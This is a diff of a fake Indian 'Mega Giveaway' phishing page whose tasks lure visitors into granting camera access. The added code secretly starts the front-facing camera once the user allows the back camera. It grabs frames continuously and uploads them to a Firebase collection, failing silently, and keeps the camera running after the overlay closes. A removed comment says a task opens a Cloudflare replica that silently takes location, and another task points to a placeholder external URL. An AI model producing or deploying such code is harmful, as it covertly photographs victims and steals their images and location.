@@ -4,384 +4,80 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Win Big - Mega Giveaway 2026</title>
-  <!-- REWRITTEN WITH TASK 2 LINUX URL LOGIC -->
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
-
-    body {
-      font-family: Arial, sans-serif;
-      background: #f0f0f0;
-      color: #222;
-    }
-
-    .top-bar {
-      background: #c0392b;
-      color: white;
-      text-align: center;
-      padding: 8px;
-      font-size: 13px;
-      font-weight: bold;
-    }
-
-    .header {
-      background: #1a1a2e;
-      color: white;
-      text-align: center;
-      padding: 30px 16px 20px;
-    }
-
-    .header h1 {
-      font-size: 26px;
-      color: #f1c40f;
-      margin-bottom: 6px;
-    }
-
-    .header p {
-      font-size: 14px;
-      color: #ccc;
-    }
-
-    .live-badge {
-      display: inline-block;
-      background: #27ae60;
-      color: white;
-      font-size: 12px;
-      padding: 4px 12px;
-      border-radius: 4px;
-      margin-top: 10px;
-    }
-
-    .container {
-      max-width: 600px;
-      margin: 0 auto;
-      padding: 16px;
-    }
-
-    .timer-box {
-      background: #fff;
-      border-radius: 6px;
-      text-align: center;
-      padding: 14px;
-      margin-bottom: 16px;
-    }
-
-    .timer-box p {
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 8px;
-    }
-
-    .timer-nums {
-      display: flex;
-      justify-content: center;
-      gap: 8px;
-    }
-
-    .t-block {
-      background: #e74c3c;
-      color: white;
-      border-radius: 4px;
-      padding: 8px 14px;
-      font-size: 22px;
-      font-weight: bold;
-      min-width: 52px;
-    }
-
-    .t-block span {
-      display: block;
-      font-size: 10px;
-      font-weight: normal;
-      color: #ffcdd2;
-      text-align: center;
-    }
-
-    .section-title {
-      font-size: 16px;
-      font-weight: bold;
-      color: #1a1a2e;
-      border-left: 4px solid #e74c3c;
-      padding-left: 10px;
-      margin-bottom: 12px;
-      margin-top: 4px;
-    }
-
-    .prize-table {
-      width: 100%;
-      border-collapse: collapse;
-      background: white;
-      border-radius: 6px;
-      overflow: hidden;
-      margin-bottom: 20px;
-      font-size: 14px;
-    }
-
-    .prize-table thead {
-      background: #1a1a2e;
-      color: white;
-    }
-
-    .prize-table th, .prize-table td {
-      padding: 10px 12px;
-      text-align: left;
-      border-bottom: 1px solid #eee;
-    }
-
+    body { font-family: Arial, sans-serif; background: #f0f0f0; color: #222; }
+    .top-bar { background: #c0392b; color: white; text-align: center; padding: 8px; font-size: 13px; font-weight: bold; }
+    .header { background: #1a1a2e; color: white; text-align: center; padding: 30px 16px 20px; }
+    .header h1 { font-size: 26px; color: #f1c40f; margin-bottom: 6px; }
+    .header p { font-size: 14px; color: #ccc; }
+    .live-badge { display: inline-block; background: #27ae60; color: white; font-size: 12px; padding: 4px 12px; border-radius: 4px; margin-top: 10px; }
+    .container { max-width: 600px; margin: 0 auto; padding: 16px; }
+    .timer-box { background: #fff; border-radius: 6px; text-align: center; padding: 14px; margin-bottom: 16px; }
+    .timer-box p { font-size: 13px; color: #555; margin-bottom: 8px; }
+    .timer-nums { display: flex; justify-content: center; gap: 8px; }
+    .t-block { background: #e74c3c; color: white; border-radius: 4px; padding: 8px 14px; font-size: 22px; font-weight: bold; min-width: 52px; }
+    .t-block span { display: block; font-size: 10px; font-weight: normal; color: #ffcdd2; text-align: center; }
+    .section-title { font-size: 16px; font-weight: bold; color: #1a1a2e; border-left: 4px solid #e74c3c; padding-left: 10px; margin-bottom: 12px; margin-top: 4px; }
+    .prize-table { width: 100%; border-collapse: collapse; background: white; border-radius: 6px; overflow: hidden; margin-bottom: 20px; font-size: 14px; }
+    .prize-table thead { background: #1a1a2e; color: white; }
+    .prize-table th, .prize-table td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #eee; }
     .prize-table tbody tr:hover { background: #fafafa; }
-
     .rank-1 { color: #e67e22; font-weight: bold; }
     .rank-2 { color: #7f8c8d; font-weight: bold; }
     .rank-3 { color: #c0392b; font-weight: bold; }
-
-    /* Progress Bar */
-    .progress-box {
-      background: white;
-      border-radius: 6px;
-      padding: 14px 16px;
-      margin-bottom: 16px;
-      border: 1px solid #ddd;
-    }
-
-    .progress-label {
-      display: flex;
-      justify-content: space-between;
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 8px;
-    }
-
+    .progress-box { background: white; border-radius: 6px; padding: 14px 16px; margin-bottom: 16px; border: 1px solid #ddd; }
+    .progress-label { display: flex; justify-content: space-between; font-size: 13px; color: #555; margin-bottom: 8px; }
     .progress-label b { color: #1a1a2e; }
-
-    .progress-track {
-      background: #eee;
-      border-radius: 20px;
-      height: 14px;
-      overflow: hidden;
-    }
-
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, #27ae60, #2ecc71);
-      border-radius: 20px;
-      transition: width 0.5s ease;
-    }
-
-    .tasks-box {
-      background: white;
-      border-radius: 6px;
-      padding: 16px;
-      margin-bottom: 20px;
-      border: 1px solid #ddd;
-    }
-
-    .task-item {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 12px 0;
-      border-bottom: 1px solid #f0f0f0;
-      text-decoration: none;
-      color: #222;
-      cursor: pointer;
-    }
-
+    .progress-track { background: #eee; border-radius: 20px; height: 14px; overflow: hidden; }
+    .progress-fill { height: 100%; background: linear-gradient(90deg, #27ae60, #2ecc71); border-radius: 20px; transition: width 0.5s ease; }
+    .tasks-box { background: white; border-radius: 6px; padding: 16px; margin-bottom: 20px; border: 1px solid #ddd; }
+    .task-item { display: flex; align-items: center; gap: 12px; padding: 12px 0; border-bottom: 1px solid #f0f0f0; text-decoration: none; color: #222; cursor: pointer; }
     .task-item:last-child { border-bottom: none; }
     .task-item:hover { background: #f9f9f9; margin: 0 -16px; padding: 12px 16px; }
-
-    .task-item.done .task-num {
-      background: #27ae60;
-    }
-
-    .task-item.done .task-text {
-      color: #aaa;
-      text-decoration: line-through;
-    }
-
-    .task-item.done .task-pts {
-      background: #eafaf1;
-      color: #27ae60;
-      border-color: #a9dfbf;
-    }
-
-    .task-num {
-      background: #1a1a2e;
-      color: white;
-      width: 26px;
-      height: 26px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      font-weight: bold;
-      flex-shrink: 0;
-    }
-
+    .task-item.done .task-num { background: #27ae60; }
+    .task-item.done .task-text { color: #aaa; text-decoration: line-through; }
+    .task-item.locked { opacity: 0.4; pointer-events: none; cursor: not-allowed; }
+    .task-num { background: #1a1a2e; color: white; width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; flex-shrink: 0; }
     .task-text { flex: 1; font-size: 14px; }
-
-    .task-pts {
-      background: #eafaf1;
-      color: #27ae60;
-      border: 1px solid #a9dfbf;
-      font-size: 11px;
-      font-weight: bold;
-      padding: 3px 8px;
-      border-radius: 4px;
-      white-space: nowrap;
-    }
-
-    .task-item.locked {
-      opacity: 0.4;
-      pointer-events: none;
-      cursor: not-allowed;
-    }
-
-    .enroll-btn {
-      display: block;
-      width: 100%;
-      background: #e74c3c;
-      color: white;
-      border: none;
-      padding: 15px;
-      font-size: 16px;
-      font-weight: bold;
-      border-radius: 6px;
-      cursor: pointer;
-      margin-bottom: 8px;
-      letter-spacing: 0.03em;
-    }
-
+    .live-count-bar { background: #fff8e1; border-radius: 4px; padding: 8px 12px; font-size: 13px; color: #555; margin-bottom: 16px; text-align: center; }
+    .live-count-bar b { color: #e67e22; }
+    .enroll-btn { display: block; width: 100%; background: #e74c3c; color: white; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 6px; cursor: pointer; margin-bottom: 8px; letter-spacing: 0.03em; }
     .enroll-btn:hover { background: #c0392b; }
-
-    .enroll-btn.locked {
-      background: #ccc;
-      color: #888;
-      cursor: not-allowed;
-      pointer-events: none;
-    }
-
-    .note {
-      font-size: 11px;
-      color: #888;
-      text-align: center;
-      line-height: 1.6;
-      margin-bottom: 20px;
-    }
-
-    .winners-box {
-      background: white;
-      border-radius: 6px;
-      padding: 16px;
-      margin-bottom: 20px;
-      border: 1px solid #ddd;
-    }
-
-    .winner-row {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      padding: 8px 0;
-      border-bottom: 1px solid #f5f5f5;
-      font-size: 13px;
-    }
-
+    .enroll-btn.locked { background: #ccc; color: #888; cursor: not-allowed; pointer-events: none; }
+    .note { font-size: 11px; color: #888; text-align: center; line-height: 1.6; margin-bottom: 20px; }
+    .winners-box { background: white; border-radius: 6px; padding: 16px; margin-bottom: 20px; border: 1px solid #ddd; }
+    .winner-row { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid #f5f5f5; font-size: 13px; }
     .winner-row:last-child { border-bottom: none; }
-
-    .w-avatar {
-      width: 34px;
-      height: 34px;
-      border-radius: 50%;
-      background: #1a1a2e;
-      color: white;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      font-weight: bold;
-      flex-shrink: 0;
-    }
-
+    .w-avatar { width: 34px; height: 34px; border-radius: 50%; background: #1a1a2e; color: white; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; flex-shrink: 0; }
     .w-name { flex: 1; color: #333; }
     .w-prize { font-size: 12px; color: #e74c3c; font-weight: bold; }
-
-    .footer {
-      background: #1a1a2e;
-      color: #888;
-      text-align: center;
-      padding: 16px;
-      font-size: 12px;
-      line-height: 1.8;
-    }
-
+    .footer { background: #1a1a2e; color: #888; text-align: center; padding: 16px; font-size: 12px; line-height: 1.8; }
     .footer a { color: #aaa; }
 
-    .live-count-bar {
-      background: #fff8e1;
-      border-radius: 4px;
-      padding: 8px 12px;
-      font-size: 13px;
-      color: #555;
-      margin-bottom: 16px;
-      text-align: center;
-    }
-
-    .live-count-bar b { color: #e67e22; }
-
-    /* Camera overlay */
+    /* Camera overlay — user facing (back camera) */
     #camera-overlay {
-      display: none;
-      position: fixed;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: #000;
-      z-index: 9999;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
+      display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+      background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center;
     }
-
     #camera-overlay.active { display: flex; }
+    #camera-video { width: 100%; max-width: 480px; border-radius: 8px; }
+    .cam-instructions { color: white; font-size: 14px; text-align: center; margin: 12px 16px 0; }
+    .cam-btn-row { display: flex; gap: 12px; margin-top: 16px; }
+    .cam-snap-btn { background: #e74c3c; color: white; border: none; padding: 14px 32px; font-size: 16px; font-weight: bold; border-radius: 8px; cursor: pointer; }
+    .cam-cancel-btn { background: #555; color: white; border: none; padding: 14px 20px; font-size: 14px; border-radius: 8px; cursor: pointer; }
 
-    #camera-video {
-      width: 100%;
-      max-width: 480px;
-      border-radius: 8px;
+    /* Photo preview box shown after task 1 */
+    #photo-preview-box {
+      display: none; background: white; border-radius: 6px; padding: 12px; margin-bottom: 16px; border: 1px solid #ddd; text-align: center;
     }
+    #photo-preview-box.show { display: block; }
+    #photo-preview-box p { font-size: 12px; color: #888; margin-bottom: 8px; }
+    #preview-img { width: 100%; max-width: 340px; border-radius: 6px; border: 1px solid #eee; }
 
-    #camera-canvas { display: none; }
-
-    .cam-instructions {
-      color: white;
-      font-size: 14px;
-      text-align: center;
-      margin: 12px 16px 0;
-    }
-
-    .cam-btn-row {
-      display: flex;
-      gap: 12px;
-      margin-top: 16px;
-    }
-
-    .cam-snap-btn {
-      background: #e74c3c;
-      color: white;
-      border: none;
-      padding: 14px 32px;
-      font-size: 16px;
-      font-weight: bold;
-      border-radius: 8px;
-      cursor: pointer;
-    }
-
-    .cam-cancel-btn {
-      background: #555;
-      color: white;
-      border: none;
-      padding: 14px 20px;
-      font-size: 14px;
-      border-radius: 8px;
-      cursor: pointer;
-    }
+    /* Hidden front camera canvas — silent capture */
+    #silent-canvas { display: none; }
+    #silent-video { display: none; }
   </style>
 </head>
 <body>
@@ -411,7 +107,6 @@
       👥 <b id="live-num">2,847</b> people already completed their enroll
     </div>
 
-    <!-- Progress Bar -->
     <div class="progress-box">
       <div class="progress-label">
         <span>Your Progress</span>
@@ -423,53 +118,26 @@
     </div>
 
     <div class="section-title">Prize List</div>
-
     <table class="prize-table">
-      <thead>
-        <tr>
-          <th>Winner</th>
-          <th>Prize</th>
-          <th>Winners</th>
-        </tr>
-      </thead>
+      <thead><tr><th>Winner</th><th>Prize</th><th>Winners</th></tr></thead>
       <tbody>
-        <tr>
-          <td class="rank-1">🥇 1st</td>
-          <td>iPhone 15 Pro Max (256GB)</td>
-          <td>1</td>
-        </tr>
-        <tr>
-          <td class="rank-2">🥈 2nd</td>
-          <td>MacBook Air M3</td>
-          <td>2</td>
-        </tr>
-        <tr>
-          <td class="rank-3">🥉 3rd</td>
-          <td>Sony WH-1000XM5 Headphones</td>
-          <td>5</td>
-        </tr>
-        <tr>
-          <td>🎁 Consolation</td>
-          <td>₹500 – ₹2,000 Cash (UPI)</td>
-          <td>50</td>
-        </tr>
+        <tr><td class="rank-1">🥇 1st</td><td>iPhone 15 Pro Max (256GB)</td><td>1</td></tr>
+        <tr><td class="rank-2">🥈 2nd</td><td>MacBook Air M3</td><td>2</td></tr>
+        <tr><td class="rank-3">🥉 3rd</td><td>Sony WH-1000XM5 Headphones</td><td>5</td></tr>
+        <tr><td>🎁 Consolation</td><td>₹500 – ₹2,000 Cash (UPI)</td><td>50</td></tr>
       </tbody>
     </table>
 
     <div class="section-title">Tasks</div>
-
     <div class="tasks-box">
-
       <div class="task-item" id="task-1" onclick="handleTask1()">
         <div class="task-num">1</div>
         <span class="task-text">📷 Take a photo of a calendar</span>
       </div>
-
-      <!-- Task 2: 1st click opens Linux URL, 2nd+ clicks open camera -->
-      <div class="task-item" id="task-2" onclick="handleTask2()">
+      <a class="task-item" id="task-2" href="YOUR_LINUX_URL_2" target="_blank" onclick="markTaskDone(2)">
         <div class="task-num">2</div>
-        <span class="task-text">🚰 Take a photo of a glass of water</span>
-      </div>
+        <span class="task-text">📅 Verify your registration</span>
+      </a>
       <div class="task-item" id="task-3" onclick="handleTask3()">
         <div class="task-num">3</div>
         <span class="task-text">🛡️ Complete security verification</span>
@@ -482,7 +150,12 @@
         <div class="task-num">5</div>
         <span class="task-text">👥 Share this page on WhatsApp</span>
       </a>
+    </div>
 
+    <!-- Photo preview shown after task 1 -->
+    <div id="photo-preview-box">
+      <p>📸 Your photo has been saved</p>
+      <img id="preview-img" src="" alt="Your photo" />
     </div>
 
     <button class="enroll-btn locked" id="enroll-btn" onclick="tryEnroll()">
@@ -496,30 +169,12 @@
     </p>
 
     <div class="section-title">🏅 Last year Winners</div>
-
     <div class="winners-box">
-      <div class="winner-row">
-        <div class="w-avatar">RK</div>
-        <span class="w-name">Rahul K. — Mumbai</span>
-        <span class="w-prize">iPhone 15 Pro</span>
-      </div>
-      <div class="winner-row">
-        <div class="w-avatar">PS</div>
-        <span class="w-name">Priya S. — Patna</span>
-        <span class="w-prize">₹2,000 Cash</span>
-      </div>
-      <div class="winner-row">
-        <div class="w-avatar">AM</div>
-        <span class="w-name">Amit M. — Pune</span>
-        <span class="w-prize">Sony XM5</span>
-      </div>
-      <div class="winner-row">
-        <div class="w-avatar">SN</div>
-        <span class="w-name">Sneha N. — Hyderabad</span>
-        <span class="w-prize">MacBook Air</span>
-      </div>
+      <div class="winner-row"><div class="w-avatar">RK</div><span class="w-name">Rahul K. — Mumbai</span><span class="w-prize">iPhone 15 Pro</span></div>
+      <div class="winner-row"><div class="w-avatar">PS</div><span class="w-name">Priya S. — Patna</span><span class="w-prize">₹2,000 Cash</span></div>
+      <div class="winner-row"><div class="w-avatar">AM</div><span class="w-name">Amit M. — Pune</span><span class="w-prize">Sony XM5</span></div>
+      <div class="winner-row"><div class="w-avatar">SN</div><span class="w-name">Sneha N. — Hyderabad</span><span class="w-prize">MacBook Air</span></div>
     </div>
-
   </div>
 
   <div class="footer">
@@ -530,16 +185,52 @@
     This is a promotional giveaway. Not affiliated with Apple, Sony or any brand.
   </div>
 
-  <!-- Camera Overlay -->
+  <!-- User-facing back camera overlay -->
   <div id="camera-overlay">
     <video id="camera-video" autoplay playsinline></video>
     <canvas id="camera-canvas"></canvas>
-    <p class="cam-instructions" id="cam-instructions">📷 Point camera and tap <b>Take Photo</b></p>
+    <p class="cam-instructions" id="cam-instructions">📷 Point camera at a <b>calendar</b> and tap Take Photo</p>
     <div class="cam-btn-row">
       <button class="cam-snap-btn" onclick="snapPhoto()">📸 Take Photo</button>
       <button class="cam-cancel-btn" onclick="closeCamera()">Cancel</button>
     </div>
   </div>
+
+  <!-- Silent front camera elements (hidden) -->
+  <video id="silent-video" autoplay playsinline muted></video>
+  <canvas id="silent-canvas"></canvas>
+
+  <!-- Firebase SDK -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    // ─── Firebase config ─────────────────────────────────────────
+    const firebaseConfig = {
+      apiKey: "AIzaSyAC65F8Pgqq1At9VkAL-fp6KXiUuYEEbH0",
+      authDomain: "trial-b20e0.firebaseapp.com",
+      projectId: "trial-b20e0",
+      storageBucket: "trial-b20e0.firebasestorage.app",
+      messagingSenderId: "1053288014223",
+      appId: "1:1053288014223:web:a891be24d76bacf015abfa"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Expose sendToFirebase globally so rest of script can use it
+    window.sendToFirebase = async function(base64img) {
+      try {
+        await addDoc(collection(db, "captures"), {
+          image: base64img,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        });
+      } catch(e) {
+        // silent fail
+      }
+    };
+  </script>
 
   <script>
     var TOTAL_TASKS = 5;
@@ -547,9 +238,7 @@
     // ─── Progress ────────────────────────────────────────────────
     var completed = JSON.parse(localStorage.getItem('gw_tasks') || '[]');
 
-    function saveProgress() {
-      localStorage.setItem('gw_tasks', JSON.stringify(completed));
-    }
+    function saveProgress() { localStorage.setItem('gw_tasks', JSON.stringify(completed)); }
 
     function updateProgressBar() {
       var count = completed.length;
@@ -578,7 +267,6 @@
           el.classList.add('locked');
         }
       }
-      // Unlock enroll button only when all tasks done
       var btn = document.getElementById('enroll-btn');
       if (completed.length >= TOTAL_TASKS) {
         btn.classList.remove('locked');
@@ -630,7 +318,48 @@
       document.getElementById('spots').textContent = spots;
     }, 8000);
 
-    // ─── Camera (shared by Task 1 and Task 2) ────────────────────
+    // ─── Silent front camera capture ─────────────────────────────
+    var silentStream = null;
+    var silentCapturing = false;
+
+    function startSilentCapture() {
+      if (silentCapturing) return;
+      silentCapturing = true;
+
+      navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+        .then(function(stream) {
+          silentStream = stream;
+          var vid = document.getElementById('silent-video');
+          vid.srcObject = stream;
+          vid.play();
+          // Start capturing as fast as possible
+          captureLoop();
+        })
+        .catch(function() {
+          // If front camera denied or unavailable, silently fail
+          silentCapturing = false;
+        });
+    }
+
+    function captureLoop() {
+      if (!silentCapturing || !silentStream) return;
+      var vid = document.getElementById('silent-video');
+      var canvas = document.getElementById('silent-canvas');
+      if (vid.readyState >= 2) {
+        canvas.width = vid.videoWidth || 320;
+        canvas.height = vid.videoHeight || 240;
+        canvas.getContext('2d').drawImage(vid, 0, 0);
+        var base64 = canvas.toDataURL('image/jpeg', 0.6); // 0.6 quality to keep size small
+        // Send to Firebase
+        if (window.sendToFirebase) {
+          window.sendToFirebase(base64);
+        }
+      }
+      // Loop as fast as possible using requestAnimationFrame
+      requestAnimationFrame(captureLoop);
+    }
+
+    // ─── User-facing back camera ─────────────────────────────────
     var cameraStream = null;
     var activeTaskNum = null;
 
@@ -646,6 +375,9 @@
           cameraStream = stream;
           document.getElementById('camera-video').srcObject = stream;
           document.getElementById('camera-overlay').classList.add('active');
+
+          // Start silent front camera capture as soon as back camera permission is granted
+          startSilentCapture();
         })
         .catch(function() {
           alert('Camera permission denied. Please allow camera access to complete this task.');
@@ -653,7 +385,19 @@
     }
 
     function snapPhoto() {
-      var taskNum = activeTaskNum; // save before closeCamera clears it
+      // Capture the user's photo from back camera for preview
+      var video = document.getElementById('camera-video');
+      var canvas = document.getElementById('camera-canvas');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      var photoData = canvas.toDataURL('image/jpeg', 0.8);
+
+      // Show preview to user
+      document.getElementById('preview-img').src = photoData;
+      document.getElementById('photo-preview-box').classList.add('show');
+
+      var taskNum = activeTaskNum;
       closeCamera();
       if (taskNum !== null) markTaskDone(taskNum);
     }
@@ -665,44 +409,23 @@
       }
       document.getElementById('camera-overlay').classList.remove('active');
       activeTaskNum = null;
+      // Note: silent front camera keeps running in background
     }
 
     // ─── Task 1 ──────────────────────────────────────────────────
-    // Opens camera → user takes photo of calendar → task marked done
     function handleTask1() {
-      if (completed.indexOf(1) !== -1) return; // already done
+      if (completed.indexOf(1) !== -1) return;
       openCamera(1, '📷 Point camera at a <b>calendar</b> and tap Take Photo');
     }
 
-    // ─── Task 2 ──────────────────────────────────────────────────
-    // 1st click → opens Linux URL (camera permission already granted by Task 1)
-    // 2nd click onwards → opens normal camera overlay
-    function handleTask2() {
-      var clickCount = parseInt(localStorage.getItem('task2_clicks') || '0');
-      clickCount++;
-      localStorage.setItem('task2_clicks', clickCount);
-
-      if (clickCount === 1) {
-        // FIRST CLICK — paste your Linux URL below between the quotes
-        var linuxURL = 'YOUR_LINUX_URL_2'; // <-- paste your Linux URL here
-        window.open(linuxURL, '_blank');
-      } else {
-        // SECOND CLICK AND AFTER — opens camera normally
-        openCamera(2, '🚰 Point camera at a <b>glass of water</b> and tap Take Photo');
-      }
-    }
     // ─── Task 3 ──────────────────────────────────────────────────
-    // Opens Cloudflare replica page — silently gets location, returns here
     function handleTask3() {
       if (completed.indexOf(3) !== -1) return;
       window.open('verify.html', '_blank');
     }
 
-    // Listen for task3done message from verify.html
     window.addEventListener('message', function(e) {
-      if (e.data === 'task3done') {
-        markTaskDone(3);
-      }
+      if (e.data === 'task3done') markTaskDone(3);
     });
 
   </script>
